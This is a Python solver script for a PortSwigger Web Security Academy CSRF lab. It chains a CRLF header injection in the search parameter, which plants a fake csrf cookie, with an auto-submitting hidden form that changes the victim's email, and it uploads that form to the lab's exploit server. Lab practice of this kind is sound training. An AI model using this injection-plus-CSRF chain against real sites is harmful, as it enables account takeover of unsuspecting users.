"""
https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie
"""

import sys
import requests
from bs4 import BeautifulSoup
import urllib

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()
"""
def getHeadersFromSearch(search_term):
    resp = requests.get(f"https://{site}/?search={search_term}")
    for header in resp.headers.items():
        print(header)

getHeadersFromSearch("baa\nSet-Cookie: foo=bar")
"""
"""
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
"""
"""
csrf = soup.find('input', {'name':'csrf'}).get('value')
print(f' csrf field in form field: {csrf}')
for header in resp.headers.items():
    print(header)

for cookie in s.cookies.items():
    print(cookie)

s.cookies.clear()
logindata = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter'
}
resp = s.post(login_url, data=logindata)
print(f"HTTP status code {resp.status_code} with text {resp.text}")
"""
"""
logindata = {
    'csrf' : 'baa',
    'username' : 'wiener',
    'password' : 'peter'
}
cookiedata = {
    'csrf' : 'baa'
}
resp = requests.post(login_url, data=logindata, cookies=cookiedata)
print(f"HTTP status code {resp.status_code}")
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')
print(f"CSRF token in HTML response is {csrf}")
"""

search_term = urllib.parse.quote("wuchang\nSet-Cookie: csrf=fake")
search_url = f'https://{site}/?search={search_term}'
print(f'URL to embed ({search_url})')

login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

exploit_html = f'''
    <form action="https://{site}/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net">
    <input type="hidden" name="csrf" value="fake">
    </form>
    <img src="{search_url}"
    onerror="document.forms[0].submit();">
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}
resp = s.post(exploit_url, data=formData)